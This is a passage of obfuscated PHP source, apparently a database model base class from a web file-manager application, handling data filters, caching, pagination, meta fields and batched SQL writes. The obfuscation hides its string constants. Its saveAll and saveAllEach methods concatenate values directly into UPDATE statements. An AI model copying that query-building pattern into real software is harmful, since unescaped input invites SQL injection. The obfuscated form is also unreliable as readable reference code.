"\x69\156\x73\145\162\164\54\165\160\144\x61\164\x65", "\146\x75\156\143\x74\151\157\156"), array("\143\x72\x65\141\164\x65\124\x69\155\145", "\x74\151\x6d\x65", "\151\x6e\163\x65\162\164", "\x66\x75\x6e\x63\164\x69\x6f\156")); public function setDataAuto($ŸÉ–¦§) { $this->dataAuto = $ŸÉ–¦§; } public function __construct($™ºÊ‚¯ = '', $ıÁƒÑñ¨ = '', $ô¿±“ıÉ = '') { parent::__construct($™ºÊ‚¯, $ıÁƒÑñ¨, $ô¿±“ıÉ); } protected $tableMeta = array(); protected function _beforeInsert(&$Â¨«ËÏÙ, $×÷§’™) { $¿ƒœ•Íà =& $_SERVER[±³—úê]; if (!$this->checkDataAutoHas($¿ƒœ•Íà[441])) { return; } $this->dataBeforeFilter($Â¨«ËÏÙ, $¿ƒœ•Íà[441]); } protected function _beforeUpdate(&$ËÅÜƒØå, $ËÛ„®İå) { $“ÚÇÄâ =& $_SERVER[±³—úê]; if (!$this->checkDataAutoHas($“ÚÇÄâ[442])) { return; } $this->dataBeforeFilter($ËÅÜƒØå, $“ÚÇÄâ[442]); } protected function _afterSelect(&$ä¼”“àò, $À·ª’·) { if (!is_array($ä¼”“àò)) { return; } if (!$this->checkDataAutoHas($_SERVER[±³—úê][443])) { return; } foreach ($ä¼”“àò as &$åú•ñß«) { $this->dataAfterFilter($åú•ñß«); } unset($åú•ñß«); } protected function _afterFind(&$Ÿ¼îšÉÌ, $ãüîú¿Á) { if (!is_array($Ÿ¼îšÉÌ)) { return; } if (!$this->checkDataAutoHas($_SERVER[±³—úê][443])) { return; } $this->dataAfterFilter($Ÿ¼îšÉÌ); } public static function textEncode($³µ÷ø Ò) { if (!$³µ÷ø Ò) { return $³µ÷ø Ò; } $¿‹Æ­ù = json_encode($³µ÷ø Ò); $¿‹Æ­ù = preg_replace_callback($_SERVER[±³—úê][444], function ($¾Ó´°÷å) { return addslashes($¾Ó´°÷å[0]); }, $¿‹Æ­ù); return json_decode($¿‹Æ­ù); } public static function textDecode($äãšµÇÄ) { $ß§°šş¼ =& $_SERVER[±³—úê]; $êÕ¬ç½Ş = json_encode($äãšµÇÄ); $êÕ¬ç½Ş = preg_replace_callback($ß§°šş¼[445], function ($¶÷¨ºáÓ) { return $_SERVER[±³—úê][100]; }, $êÕ¬ç½Ş); return json_decode($êÕ¬ç½Ş); } public function setAutoIncrement($«âıåÑ) { $– íÆ = array($this->getPk() => $«âıåÑ); $ÔÇÜ‡†â = $this->data($– íÆ)->add(); if ($ÔÇÜ‡†â) { $this->delete($ÔÇÜ‡†â); } } public function getAutoIncrement() { $í½”Ì©œ = $this->getTableName(); $ÄØÚÈÍô = $this->max($this->getPk()); $‚±¨”· = $this->query("\163\150\x6f\167\x20\x74\x61\x62\154\145\40\163\164\141\164\x75\x73\x20\x77\150\145\162\145\40\x4e\141\155\x65\75\x27{$í½”Ì©œ}\x27"); $åÎØæÖ = $‚±¨”·[0][$_SERVER[±³—úê][446]]; $—Æ™»÷é = max($ÄØÚÈÍô, $åÎØæÖ); return $—Æ™»÷é; } protected function _callBefore($¿Ú÷£¾Š, $¾ä¤˜ÇÅ) { return $this->cacheCallCheck($¿Ú÷£¾Š, $¾ä¤˜ÇÅ, !1); } protected function _callAfter($ƒ½¸‡Ç´, $ëÉ±†ïÈ) { return $this->cacheCallCheck($ƒ½¸‡Ç´, $ëÉ±†ïÈ, !0); } protected function cacheFunctionAlias($÷ôšÛüê) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($§ÓºÊÏÈ, $©Õõ–íë, $Ë³“ÕÏ = false) { $µªüÔùâ =& $_SERVER[±³—úê]; $¥ß¥æœ = $this->cacheFunctionAlias($©Õõ–íë); if (!$¥ß¥æœ) { return; } foreach ($¥ß¥æœ as $É¼ºÒ¹« => $èœÚÂè¦) { $§µıÌî = $èœÚÂè¦[0]; $ûÁüØÎ‚ = explode($µªüÔùâ[50], $èœÚÂè¦[1]); $´Óşœöı = isset($èœÚÂè¦[2]) ? $èœÚÂè¦[2] : $µªüÔùâ[12]; if ($§ÓºÊÏÈ == $É¼ºÒ¹«) { return $this->cacheFunctionGet($É¼ºÒ¹«, $§µıÌî, $´Óşœöı); } if ($Ë³“ÕÏ && in_array($§ÓºÊÏÈ, $ûÁüØÎ‚)) { $this->cacheFunctionClear($É¼ºÒ¹«, $§µıÌî, $´Óşœöı); } } } public function cacheFunctionGet($©Ü–—ü, $¼şƒÜ¶, $À²Ü÷  = '') { $ê²ûÛ“Ë = $this->cacheKeyMake($©Ü–—ü, $¼şƒÜ¶, $À²Ü÷ ); $¦®œíÅ¶ = Cache::get($ê²ûÛ“Ë); if (!is_array($¦®œíÅ¶)) { $¦®œíÅ¶ = call_user_func_array(array($this, $©Ü–—ü), array($¼şƒÜ¶, !0)); Cache::set($ê²ûÛ“Ë, $¦®œíÅ¶); } return $¦®œíÅ¶; } public function cacheFunctionClear($Æõ¤ÅÍÔ, $Ôò¹·­´, $ö†“•´Â = '') { $Ñ‚Ö¼®ü = $Ôò¹·­´; if (!is_array($Ôò¹·­´)) { $Ñ‚Ö¼®ü = array($Ôò¹·­´); } foreach ($Ñ‚Ö¼®ü as $’ŒÆ¨¿) { $Â¶Â‚óâ = $this->cacheKeyMake($Æõ¤ÅÍÔ, $’ŒÆ¨¿, $ö†“•´Â); Cache::remove($Â¶Â‚óâ); } } private function cacheKeyMake($âìÂ°Ş­, $Ò±î‹œÚ, $Ù”Êã‹’) { $À…Øû² =& $_SERVER[±³—úê]; if ($Ù”Êã‹’) { $Ò±î‹œÚ = $Ò±î‹œÚ . $À…Øû²[447] . $Ù”Êã‹’; } return get_class($this) . $À…Øû²[11] . $âìÂ°Ş­ . $À…Øû²[448] . $Ò±î‹œÚ; } protected function selectPageReset() { $¹ÒÚÙš¦ =& $_SERVER[±³—úê]; if (isset($GLOBALS[$¹ÒÚÙš¦[449]])) { return; } $GLOBALS[$¹ÒÚÙš¦[449]] = isset($GLOBALS[$¹ÒÚÙš¦[7]][$¹ÒÚÙš¦[450]]) ? $GLOBALS[$¹ÒÚÙš¦[7]][$¹ÒÚÙš¦[450]] : !1; $GLOBALS[$¹ÒÚÙš¦[451]] = isset($GLOBALS[$¹ÒÚÙš¦[7]][$¹ÒÚÙš¦[439]]) ? $GLOBALS[$¹ÒÚÙš¦[7]][$¹ÒÚÙš¦[439]] : !1; $GLOBALS[$¹ÒÚÙš¦[7]][$¹ÒÚÙš¦[450]] = !1; $GLOBALS[$¹ÒÚÙš¦[7]][$¹ÒÚÙš¦[439]] = !1; } protected function selectPageRestore() { $œÒ”¥ÏØ =& $_SERVER[±³—úê]; if (!isset($GLOBALS[$œÒ”¥ÏØ[449]])) { return; } $GLOBALS[$œÒ”¥ÏØ[7]][$œÒ”¥ÏØ[450]] = $GLOBALS[$œÒ”¥ÏØ[449]]; $GLOBALS[$œÒ”¥ÏØ[7]][$œÒ”¥ÏØ[439]] = $GLOBALS[$œÒ”¥ÏØ[451]]; if ($GLOBALS[$œÒ”¥ÏØ[7]][$œÒ”¥ÏØ[450]] === !1) { unset($GLOBALS[$œÒ”¥ÏØ[7]][$œÒ”¥ÏØ[450]]); } if ($GLOBALS[$œÒ”¥ÏØ[7]][$œÒ”¥ÏØ[439]] === !1) { unset($GLOBALS[$œÒ”¥ÏØ[7]][$œÒ”¥ÏØ[439]]); } unset($GLOBALS[$œÒ”¥ÏØ[449]]); unset($GLOBALS[$œÒ”¥ÏØ[451]]); } protected function selectPage($±ÉÃ¢Ôá = 200, $ºŸ¼Ö³· = 1) { $åŒ‹ Š =& $_SERVER[±³—úê]; global $in; $ÄÑÏç„ = $this->optionsValue(); $ï€Õ¡Ûü = 50000; $±ÉÃ¢Ôá = isset($in[$åŒ‹ Š[450]]) && $in[$åŒ‹ Š[450]] ? $in[$åŒ‹ Š[450]] : $±ÉÃ¢Ôá; if ($±ÉÃ¢Ôá === -1) { $in[$åŒ‹ Š[450]] = !1; $ï€Õ¡Ûü = 100000000; $±ÉÃ¢Ôá = $ï€Õ¡Ûü; } $§³„¤ = $ÄÑÏç„; $§³„¤[$åŒ‹ Š[452]] = array(); $±ÉÃ¢Ôá = intval($±ÉÃ¢Ôá); $±ÉÃ¢Ôá = $±ÉÃ¢Ôá <= 5 ? 5 : ($±ÉÃ¢Ôá >= $ï€Õ¡Ûü ? $ï€Õ¡Ûü : $±ÉÃ¢Ôá); $ºŸ¼Ö³· = intval(isset($in[$åŒ‹ Š[439]]) && $in[$åŒ‹ Š[439]] ? $in[$åŒ‹ Š[439]] : $ºŸ¼Ö³·); $ºŸ¼Ö³· = $ºŸ¼Ö³· <= 1 ? 1 : $ºŸ¼Ö³·; $Ã¹Å±€ = array(); $ÊĞŠ›¾Ğ = 1; if ($ºŸ¼Ö³· == 1 && $ÊĞŠ›¾Ğ) { $this->optionsValue($ÄÑÏç„); $Ã¹Å±€ = $this->page($ºŸ¼Ö³·, $±ÉÃ¢Ôá)->select(); $·èÙíÀ® = is_array($Ã¹Å±€) ? count($Ã¹Å±€) : 0; if ($·èÙíÀ® < $±ÉÃ¢Ôá) { $¬¨ÏñÍ“ = 1; } else { $this->optionsValue($§³„¤); $·èÙíÀ® = intval($this->count()); $¬¨ÏñÍ“ = ceil($·èÙíÀ® / $±ÉÃ¢Ôá); } } else { $this->optionsValue($§³„¤); $·èÙíÀ® = intval($this->count()); $¬¨ÏñÍ“ = ceil($·èÙíÀ® / $±ÉÃ¢Ôá); $ºŸ¼Ö³· = $ºŸ¼Ö³· >= $¬¨ÏñÍ“ ? $¬¨ÏñÍ“ : $ºŸ¼Ö³·; $this->optionsValue($ÄÑÏç„); $Ã¹Å±€ = $this->page($ºŸ¼Ö³·, $±ÉÃ¢Ôá)->select(); } if (!is_array($Ã¹Å±€)) { $Ã¹Å±€ = array(); } if ($¬¨ÏñÍ“ == 1) { $·èÙíÀ® = count($Ã¹Å±€); } $Ïòµ‡ı = array($åŒ‹ Š[453] => array($åŒ‹ Š[454] => $·èÙíÀ®, $åŒ‹ Š[450] => $±ÉÃ¢Ôá, $åŒ‹ Š[439] => $ºŸ¼Ö³·, $åŒ‹ Š[455] => $¬¨ÏñÍ“), $åŒ‹ Š[456] => $Ã¹Å±€); return $Ïòµ‡ı; } protected function checkLength($®á‹”€–, $£ÙÜÓ = 0, $û¢Ôä¸¥ = '') { $± •˜«” =& $_SERVER[±³—úê]; $£ÙÜÓ = $£ÙÜÓ ? $£ÙÜÓ : 65536; if (!$®á‹”€– || strlen($®á‹”€–) < $£ÙÜÓ) { return; } $û¢Ôä¸¥ = $û¢Ôä¸¥ ? $û¢Ôä¸¥ . $± •˜«”[74] : $± •˜«”[12]; show_json($û¢Ôä¸¥ . LNG($± •˜«”[457]) . "\50{$£ÙÜÓ}\51", !1); } protected function metaSet($¡üÌµêÊ, $ŞÅÖ¿Š = null, $°…™˜—õ = null) { $ÄÄ•˜Ù÷ =& $_SERVER[±³—úê]; if (!$this->tableMeta || !$¡üÌµêÊ) { return !1; } $Ëˆ»¹ØÛ = $this->tableMeta[$ÄÄ•˜Ù÷[458]]; $ßäû×¸‰ = $this->tableMeta[$ÄÄ•˜Ù÷[459]]; $—œñ›ö« = Model($ßäû×¸‰); $Ò €Ø“ù = array($Ëˆ»¹ØÛ => $¡üÌµêÊ, $ÄÄ•˜Ù÷[460] => $ŞÅÖ¿Š); if (is_null($ŞÅÖ¿Š)) { return $—œñ›ö«->where(array($Ëˆ»¹ØÛ => $¡üÌµêÊ))->delete(); } if (is_null($°…™˜—õ) && is_string($ŞÅÖ¿Š)) { return $—œñ›ö«->where($Ò €Ø“ù)->delete(); } $¤ÔŞŒ† = is_array($ŞÅÖ¿Š) ? $ŞÅÖ¿Š : array(); if (is_string($ŞÅÖ¿Š)) { $¤ÔŞŒ†[$ŞÅÖ¿Š] = $°…™˜—õ; } $ƒ¾¶Êâ† = array(); foreach ($¤ÔŞŒ† as $Àñöæ“± => $§ùÀ›¢Ï) { if (is_null($§ùÀ›¢Ï) && is_string($Àñöæ“±)) { $—œñ›ö«->where(array($Ëˆ»¹ØÛ => $¡üÌµêÊ, $ÄÄ•˜Ù÷[460] => $Àñöæ“±))->delete(); continue; } $this->checkLength($§ùÀ›¢Ï, !1, $ßäû×¸‰ . $ÄÄ•˜Ù÷[4] . $Àñöæ“±); $ƒ¾¶Êâ†[] = array($Ëˆ»¹ØÛ => $¡üÌµêÊ, $ÄÄ•˜Ù÷[97] => $Àñöæ“±, $ÄÄ•˜Ù÷[461] => $§ùÀ›¢Ï); } $£Ø²§¸” = $ÄÄ•˜Ù÷[462] . $ßäû×¸‰; CacheLock::lock($£Ø²§¸”); $—œñ›ö«->where(array($Ëˆ»¹ØÛ => $¡üÌµêÊ))->addAll($ƒ¾¶Êâ†, array(), !0); CacheLock::unlock($£Ø²§¸”); return !0; } public function metaGet($šâá¡ŞŒ, $‡Şãò¹¤ = false) { $Åîşù†ó =& $_SERVER[±³—úê]; if (!$this->tableMeta) { return array(); } $£Ø™ø¬¥ = $this->tableMeta[$Åîşù†ó[458]]; $¿«‡ûá = Model($this->tableMeta[$Åîşù†ó[459]]); if ($‡Şãò¹¤) { $‰æµùÙú = array($£Ø™ø¬¥ => $šâá¡ŞŒ, $Åîşù†ó[97] => $‡Şãò¹¤); return $¿«‡ûá->where($‰æµùÙú)->getField($Åîşù†ó[461]); } $‰æµùÙú = array($£Ø™ø¬¥ => $šâá¡ŞŒ); $‘á¹³Õ = $¿«‡ûá->field($Åîşù†ó[463])->where($‰æµùÙú)->select(); $‘á¹³Õ = array_to_keyvalue($‘á¹³Õ, $Åîşù†ó[97], $Åîşù†ó[461]); return $‘á¹³Õ; } private function checkDataAutoHas($£†÷Ê´) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ê°Ù¨üÇ) { if (in_array($£†÷Ê´, explode($_SERVER[±³—úê][50], $Ê°Ù¨üÇ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$±Øı•‹—, $°’í’€•) { $åÒÅÍÍû =& $_SERVER[±³—úê]; if (!is_array($±Øı•‹—)) { return; } foreach ($this->dataAuto as $äÛğÑéŠ) { $±º„ú©ö = $äÛğÑéŠ[0]; if (!in_array($°’í’€•, explode($åÒÅÍÍû[50], $äÛğÑéŠ[2]))) { continue; } switch (trim($äÛğÑéŠ[3])) { case $åÒÅÍÍû[407]: case $åÒÅÍÍû[408]: $¥€ĞÃêÑ = $äÛğÑéŠ[1]; $ÜÌŠ«Ğ = isset($äÛğÑéŠ[4]) ? (array) $äÛğÑéŠ[4] : array(); if ($¥€ĞÃêÑ == $åÒÅÍÍû[206] && array_key_exists($±º„ú©ö, $±Øı•‹—)) { if (!$±Øı•‹—[$±º„ú©ö]) { unset($±Øı•‹—[$±º„ú©ö]); } break; } if (isset($±Øı•‹—[$±º„ú©ö])) { array_unshift($ÜÌŠ«Ğ, $±Øı•‹—[$±º„ú©ö]); } if ($åÒÅÍÍû[407] == $äÛğÑéŠ[3]) { $±Øı•‹—[$±º„ú©ö] = call_user_func_array($¥€ĞÃêÑ, $ÜÌŠ«Ğ); } else { $±Øı•‹—[$±º„ú©ö] = call_user_func_array(array(&$this, $¥€ĞÃêÑ), $ÜÌŠ«Ğ); } break; case $åÒÅÍÍû[358]: if (isset($±Øı•‹—[$±º„ú©ö]) && $±Øı•‹—[$±º„ú©ö]) { $±Øı•‹—[$±º„ú©ö] = call_user_func_array(array(&$this, $äÛğÑéŠ[1]), array($±Øı•‹—[$±º„ú©ö])); } break; case $åÒÅÍÍû[361]: $±Øı•‹—[$±º„ú©ö] = $±Øı•‹—[$äÛğÑéŠ[1]]; break; case $åÒÅÍÍû[380]: if (isset($±Øı•‹—[$±º„ú©ö]) && !is_string($±Øı•‹—[$±º„ú©ö])) { $±Øı•‹—[$±º„ú©ö] = json_encode_force($±Øı•‹—[$±º„ú©ö]); } break; case $åÒÅÍÍû[409]: if ($±Øı•‹—[$±º„ú©ö] === $åÒÅÍÍû[12]) { unset($±Øı•‹—[$±º„ú©ö]); } break; case $åÒÅÍÍû[410]: $±Øı•‹—[$±º„ú©ö] = $äÛğÑéŠ[1]; default: break; } } if ($°’í’€• == $åÒÅÍÍû[441]) { $ˆÂŸ‚ğÌ = strtolower($this->db->getDbType()); if (strpos($ˆÂŸ‚ğÌ, $åÒÅÍÍû[13]) !== 0) { return; } $’µ¯–É° = $this->field(!0)->fields; $¹ÒÜÊè = $’µ¯–É°[$åÒÅÍÍû[340]]; if (isset($’µ¯–É°[$åÒÅÍÍû[339]])) { unset($¹ÒÜÊè[$’µ¯–É°[$åÒÅÍÍû[339]]]); } foreach ($¹ÒÜÊè as $Õª×ú¥ => $°’í’€•) { if (!isset($±Øı•‹—[$Õª×ú¥])) { $±Øı•‹—[$Õª×ú¥] = $åÒÅÍÍû[12]; } } } } private function dataAfterFilter(&$æŞºû«) { $”ô•öòö =& $_SERVER[±³—úê]; foreach ($this->dataAuto as $ÂªÊÆğ) { $Á¸§å¤  = $ÂªÊÆğ[0]; if (!isset($æŞºû«[$Á¸§å¤ ])) { continue; } if (!in_array($”ô•öòö[443], explode($”ô•öòö[50], $ÂªÊÆğ[2]))) { continue; } switch (trim($ÂªÊÆğ[3])) { case $”ô•öòö[407]: case $”ô•öòö[408]: $–ì’ÂÁÍ = isset($ÂªÊÆğ[4]) ? (array) $ÂªÊÆğ[4] : array(); array_unshift($–ì’ÂÁÍ, $æŞºû«[$Á¸§å¤ ]); if (isset($ÂªÊÆğ[4]) && $ÂªÊÆğ[4] == $”ô•öòö[464]) { $–ì’ÂÁÍ = array($æŞºû«[$Á¸§å¤ ]); } if ($”ô•öòö[407] == $ÂªÊÆğ[3]) { $æŞºû«[$Á¸§å¤ ] = call_user_func_array($ÂªÊÆğ[1], $–ì’ÂÁÍ); } else { $æŞºû«[$Á¸§å¤ ] = call_user_func_array(array(&$this, $ÂªÊÆğ[1]), $–ì’ÂÁÍ); } break; case $”ô•öòö[358]: if (isset($æŞºû«[$Á¸§å¤ ]) && $æŞºû«[$Á¸§å¤ ]) { $æŞºû«[$Á¸§å¤ ] = call_user_func_array(array(&$this, $ÂªÊÆğ[1]), array($æŞºû«[$Á¸§å¤ ])); } break; case $”ô•öòö[361]: $æŞºû«[$Á¸§å¤ ] = $æŞºû«[$ÂªÊÆğ[1]]; break; case $”ô•öòö[380]: $êï”ç = $æŞºû«[$Á¸§å¤ ]; $æŞºû«[$Á¸§å¤ ] = json_decode($êï”ç, !0); if (is_null($æŞºû«[$Á¸§å¤ ])) { $æŞºû«[$Á¸§å¤ ] = $êï”ç; } break; case $”ô•öòö[409]: if ($æŞºû«[$Á¸§å¤ ] === $”ô•öòö[12]) { unset($æŞºû«[$Á¸§å¤ ]); } break; case $”ô•öòö[410]: $æŞºû«[$Á¸§å¤ ] = $ÂªÊÆğ[1]; break; default: break; } } } public function saveAll($Åû¦À¸) { $«¼”ÉèÈ =& $_SERVER[±³—úê]; $× ´ñúí = $this->tablePrefix . $this->tableName; $ÍÃº¸Êª = self::SQL_WHERE_IN_CHUNK; $Åû¦À¸ = is_array($Åû¦À¸) ? $Åû¦À¸ : array(); $ÕŠ¯¦œÓ = $«¼”ÉèÈ[465]; $îùÂç“ = 0; $ªõªÍ“Ç = array(); $Ä·Ç•á = count($Åû¦À¸); for ($´ôÆ»Ñ¦ = 0; $´ôÆ»Ñ¦ < $Ä·Ç•á; $´ôÆ»Ñ¦++) { $å‚Œ¥ß‰ = $Åû¦À¸[$´ôÆ»Ñ¦]; if (!is_array($å‚Œ¥ß‰) || count($å‚Œ¥ß‰) != 4) { continue; } $ğ×ğşµ´ = "\x55\120\x44\x41\x54\105\x20\x60{$× ´ñúí}\140\x20\123\105\x54\40{$å‚Œ¥ß‰[2]}\x20\75\x20\x43\101\123\105\x20{$å‚Œ¥ß‰[0]}\x20\xa"; if ($îùÂç“ == 0) { $ÕŠ¯¦œÓ = $ğ×ğşµ´; } $ªõªÍ“Ç[] = $«¼”ÉèÈ[121] . $å‚Œ¥ß‰[1] . $«¼”ÉèÈ[121]; $îùÂç“++; $ÕŠ¯¦œÓ .= "\40\127\x48\x45\x4e\x20\x27{$å‚Œ¥ß‰[1]}\47\40\124\x48\105\x4e\40\x27{$å‚Œ¥ß‰[3]}\x27\40\12"; if ($îùÂç“ == $ÍÃº¸Êª || $´ôÆ»Ñ¦ == $Ä·Ç•á - 1) { $É€ô†„© = implode($«¼”ÉèÈ[50], $ªõªÍ“Ç); $ÕŠ¯¦œÓ .= "\40\105\x4e\104\x20\40\x57\110\x45\x52\105\x20{$å‚Œ¥ß‰[0]}\40\x49\x4e\x20\x28{$É€ô†„©}\x29\40"; $this->execute($ÕŠ¯¦œÓ); $îùÂç“ = 0; $ÕŠ¯¦œÓ = $ğ×ğşµ´; $this->chunkEventCheck(count($ªõªÍ“Ç)); $ªõªÍ“Ç = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ô®íœ€) { $ÁğäÈÅ =& $_SERVER[±³—úê]; $£ë©œŠ = $this->tablePrefix . $this->tableName; foreach ($Ô®íœ€ as $å¨Í¤ü) { if (!is_array($å¨Í¤ü) || count($å¨Í¤ü) != 4) { continue; } $üèÑÃç€ = $å¨Í¤ü[0] . $ÁğäÈÅ[466] . $å¨Í¤ü[1] . $ÁğäÈÅ[121]; $¤×É¹ôØ = $å¨Í¤ü[2] . $ÁğäÈÅ[466] . $å¨Í¤ü[3] . $ÁğäÈÅ[121]; $šßï‘Æ = "\x75\160\144\x61\164\145\40{$£ë©œŠ}\40\x73\145\164\40{$¤×É¹ôØ}\x20\x77\150\x65\162\145\40{$üèÑÃç€}\73"; $this->execute($šßï‘Æ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($²¡©€€ü = false, $£ˆï…¥ = false) { $this->_chunkEvent = $²¡©€€ü; $this->_chunkEventParam = $£ˆï…¥; } private function chunkEventCheck($¦ªıÙ¯÷) { if (!$this->_chunkEvent) { return; } $½ØÎİñˆ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $½ØÎİñˆ[$_SERVER[±³—úê][467]] = $¦ªıÙ¯÷; Hook::trigger($this->_chunkEvent, $½ØÎİñˆ); } public function addAll($æİšñ¶“, $¹¦Á²¹î = array(), $§æÑûÇ‚ = false) { $Æ‹æ•ış =& $_SERVER[±³—úê]; ignore_timeout(); $¥°£§™— = self::SQL_WHERE_IN_CHUNK; if (empty($æİšñ¶“)) { $this->error = think_lang($Æ‹æ•ış[359]); return !1; } $¹¦Á²¹î = $this->_parseOptions($¹¦Á²¹î); foreach ($æİšñ¶“ as $åÅÑŞÉâ => $¼Ëî’ää) { $æİšñ¶“[$åÅÑŞÉâ] = $this->_facade($¼Ëî’ää); $this->_beforeInsert($æİšñ¶“[$åÅÑŞÉâ], $¹¦Á²¹î); } if (method_exists($this->db, $Æ‹æ•ış[360])) { for ($¦º¼óÉ‡ = 0; $¦º¼óÉ‡ < count($æİšñ¶“); $¦º¼óÉ‡ += $¥°£§™—) { $µ²Ü®ğ÷ = array_slice($æİšñ¶“, $¦º¼óÉ‡, $¥°£§™—); if (!is_array($µ²Ü®ğ÷) || count($µ²Ü®ğ÷) == 0) { break; } $×ç”ÜÄÆ = $this->db->insertAll($µ²Ü®ğ÷, $¹¦Á²¹î, $§æÑûÇ‚); $this->chunkEventCheck(count($µ²Ü®ğ÷)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($æİšñ¶“ as $åÅÑŞÉâ => $¼Ëî’ää) { $×ç”ÜÄÆ = $this->db->insert($¼Ëî’ää, $¹¦Á²¹î, $§æÑûÇ‚); } $this->commit(); } if (!1 !== $×ç”ÜÄÆ) { $¼ÇãŸìî = $this->getLastInsID(); if ($¼ÇãŸìî) { return $¼ÇãŸìî; } } return $×ç”ÜÄÆ; } public function save($±Û¤¨¦ = '', $…İœ½íã = array()) { $»³¨‰²‚ =& $_SERVER[±³—úê]; $Ú˜şô = self::SQL_WHERE_IN_CHUNK; $»¿êÊƒ¢ = $this->optionsValue(); $×íÁàıø = $this->findWhereField($»¿êÊƒ¢); if (!$×íÁàıø) { return parent::save($±Û¤¨¦, $…İœ½íã); } $üëÏ‰ûÈ = 0; $åâÀŸÊ” = $»¿êÊƒ¢[$»³¨‰²‚[363]][$×íÁàıø][1]; $åâÀŸÊ” = is_array($åâÀŸÊ”) ? $åâÀŸÊ” : array(); $Íôæ»®Ê = count($åâÀŸÊ”); for ($ŞñØäş = 0; $ŞñØäş < $Íôæ»®Ê; $ŞñØäş += $Ú˜şô) { $’¿Äù = array_slice($åâÀŸÊ”, $ŞñØäş, $Ú˜şô); if (!is_array($’¿Äù) || count($’¿Äù) == 0) { break; } $»¿êÊƒ¢[$»³¨‰²‚[363]][$×íÁàıø][1] = $’¿Äù; $this->optionsValue($»¿êÊƒ¢); $üëÏ‰ûÈ += parent::save($±Û¤¨¦, $…İœ½íã); $this->chunkEventCheck(count($’¿Äù)); } $this->chunkEventSet(); return $üëÏ‰ûÈ; } public function add($çëö®àÚ = '', $ôĞ©¾í = array(), $™—åÂ—Ô = false) { if ($this->addTaskStatus && is_array($çëö®àÚ)) { $this->addTaskData[] = $çëö®àÚ; return; } return parent::add($çëö®àÚ, $ôĞ©¾í, $™—åÂ—Ô); } public function parseWhereLike($ıüÀİ´’, $¿Ö‡È¢  = '', $º¹»Ø÷Û = false, &$ÛÀ£¤à¡ = false) { $×ÈÕÙÖÂ =& $_SERVER[±³—úê]; $”÷ËÙÂÎ = $GLOBALS[$×ÈÕÙÖÂ[6]][$×ÈÕÙÖÂ[468]]; if (!$”÷ËÙÂÎ[$×ÈÕÙÖÂ[469]]) { return $ıüÀİ´’; } if (!is_array($ıüÀİ´’)) { return $ıüÀİ´’; } $¬Ö¬·…è = array(); $ØûÑ×ÚÊ = 0; foreach ($ıüÀİ´’ as $¢­Ñ¹œÊ => $ıÅ¹œ¸) { if (is_array($ıÅ¹œ¸) && count($ıÅ¹œ¸) == 2 && $ıÅ¹œ¸[0] == $×ÈÕÙÖÂ[470] && is_string($ıÅ¹œ¸[1]) && substr($ıÅ¹œ¸[1], 0, 1) == $×ÈÕÙÖÂ[471] && substr($ıÅ¹œ¸[1], strlen($ıÅ¹œ¸[1]) - 1, 1) == $×ÈÕÙÖÂ[471]) { $ÛÀ£¤à¡ = !0; $Ò·òÉ“Ï = is_string($¢­Ñ¹œÊ) ? $¢­Ñ¹œÊ : $¿Ö‡È¢ ; $­Äáëêâ = substr($ıÅ¹œ¸[1], 1, strlen($ıÅ¹œ¸[1]) - 2); $­Äáëêâ = $this->db->escapeString($­Äáëêâ); if (!strpos($Ò·òÉ“Ï, $×ÈÕÙÖÂ[10])) { $Ò·òÉ“Ï = $×ÈÕÙÖÂ[472] . $Ò·òÉ“Ï . $×ÈÕÙÖÂ[472]; } $Ïø˜Ã¡¾ = $×ÈÕÙÖÂ[232] . $­Äáëêâ . $×ÈÕÙÖÂ[232]; $­Äáëêâ = str_replace(array($×ÈÕÙÖÂ[10], $×ÈÕÙÖÂ[473], $×ÈÕÙÖÂ[11]), $×ÈÕÙÖÂ[474], $­Äáëêâ); if ($”÷ËÙÂÎ[$×ÈÕÙÖÂ[475]]) { $Ïø˜Ã¡¾ = $×ÈÕÙÖÂ[476] . $­Äáëêâ . $×ÈÕÙÖÂ[477]; if ($”÷ËÙÂÎ[$×ÈÕÙÖÂ[478]]) { $Ïø˜Ã¡¾ = $×ÈÕÙÖÂ[477] . $­Äáëêâ . $×ÈÕÙÖÂ[476]; } } $¬Ö¬·…è[$ØûÑ×ÚÊ] = $×ÈÕÙÖÂ[479] . $Ò·òÉ“Ï . $×ÈÕÙÖÂ[480] . $Ïø˜Ã¡¾ . $×ÈÕÙÖÂ[481]; $ØûÑ×ÚÊ++; continue; } if (is_array($ıÅ¹œ¸)) { $¿Ö‡È¢  = is_string($¢­Ñ¹œÊ) ? $¢­Ñ¹œÊ : $¿Ö‡È¢ ; $ıÅ¹œ¸ = $this->parseWhereLike($ıÅ¹œ¸, $¿Ö‡È¢ , !0, $ÛÀ£¤à¡); } if (is_numeric($¢­Ñ¹œÊ)) { $¬Ö¬·…è[$ØûÑ×ÚÊ] = $ıÅ¹œ¸; $ØûÑ×ÚÊ++; } else { $¬Ö¬·…è[$¢­Ñ¹œÊ] = $ıÅ¹œ¸; } } if ($ÛÀ£¤à¡ && !$º¹»Ø÷Û) { } return $¬Ö¬·…è; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($À›©ƒ¥ = array()) { $ÙÜ–°ú =& $_SERVER[±³—úê]; $¿Œ¶ö€€ = self::SQL_WHERE_IN_CHUNK; $†‡šµ¦ = $this->optionsValue(); $ü•îÄã = $this->findWhereField($†‡šµ¦); if (!$ü•îÄã || isset($†‡šµ¦[$ÙÜ–°ú[378]]) || isset($†‡šµ¦[$ÙÜ–°ú[439]])) { return parent::select($À›©ƒ¥); } $ëÁÒÑò = $†‡šµ¦[$ÙÜ–°ú[363]][$ü•îÄã][1]; $ëÁÒÑò = is_array($ëÁÒÑò) ? $ëÁÒÑò : array(); $ø¾ñŠàç = null; for ($è™‡ƒõ‰ = 0; $è™‡ƒõ‰ < count($ëÁÒÑò); $è™‡ƒõ‰ += $¿Œ¶ö€€) { $ˆÜ¼¥Ü™ = array_slice($ëÁÒÑò, $è™‡ƒõ‰, $¿Œ¶ö€€); if (!is_array($ˆÜ¼¥Ü™) || 